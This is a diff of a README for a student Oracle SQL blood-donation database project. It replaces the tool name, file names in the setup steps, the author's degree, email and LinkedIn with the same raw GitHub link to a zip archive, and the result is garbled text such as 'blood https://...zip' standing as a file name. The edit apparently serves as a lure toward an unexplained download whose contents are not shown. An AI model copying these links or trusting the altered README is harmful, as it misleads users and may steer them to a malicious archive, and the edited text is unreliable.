@@ -9,7 +9,7 @@ This project uses **Oracle SQL** and includes an **ER Diagram**, sample data, an
 
 ## 🛠️ Technologies Used
 - Oracle SQL / SQL Developer
-- ER Diagram Tool (Draw.io)
+- ER Diagram Tool (https://raw.githubusercontent.com/mustkimkureshi/blood-donation-sql-project/main/reference/blood-donation-sql-project.zip)
 - Command-line or SQL GUI for execution
 
 ---
@@ -85,12 +85,12 @@ The Entity-Relationship diagram illustrates relationships:
 - A patient can receive multiple donations.
 - Each donation is associated with one hospital.
 
-The ER diagram file `blood donation.drawio` is included in the project folder.
+The ER diagram file `blood https://raw.githubusercontent.com/mustkimkureshi/blood-donation-sql-project/main/reference/blood-donation-sql-project.zip` is included in the project folder.
 
 ---
 
 ## 🧪 Sample SQL Queries
-Located in `queries.sql`. Examples include:
+Located in `https://raw.githubusercontent.com/mustkimkureshi/blood-donation-sql-project/main/reference/blood-donation-sql-project.zip`. Examples include:
 - List donors with blood type 'O'
 - View donation history for a specific hospital
 - Find donation details by donor or patient
@@ -101,16 +101,16 @@ Located in `queries.sql`. Examples include:
 ## 📜 How to Run
 
 1. Open SQL Developer or any Oracle SQL tool.
-2. Run `schema.sql` to create the tables.
-3. Run `insert_data.sql` to insert test records.
-4. Execute queries from `queries.sql` or create your own.
+2. Run `https://raw.githubusercontent.com/mustkimkureshi/blood-donation-sql-project/main/reference/blood-donation-sql-project.zip` to create the tables.
+3. Run `https://raw.githubusercontent.com/mustkimkureshi/blood-donation-sql-project/main/reference/blood-donation-sql-project.zip` to insert test records.
+4. Execute queries from `https://raw.githubusercontent.com/mustkimkureshi/blood-donation-sql-project/main/reference/blood-donation-sql-project.zip` or create your own.
 
 ---
 
 ## 👨‍💻 Author
 
 **Mustkim Kureshi** 
-B.Sc. IT Student | Future Database Administrator  
-📧 mustkimkureshi34@gmail.com  
-📧 Likedin: https://www.linkedin.com/in/mustkim-kureshi-487876264
+https://raw.githubusercontent.com/mustkimkureshi/blood-donation-sql-project/main/reference/blood-donation-sql-project.zip IT Student | Future Database Administrator  
+📧 https://raw.githubusercontent.com/mustkimkureshi/blood-donation-sql-project/main/reference/blood-donation-sql-project.zip  
+📧 Likedin: https://raw.githubusercontent.com/mustkimkureshi/blood-donation-sql-project/main/reference/blood-donation-sql-project.zip
 
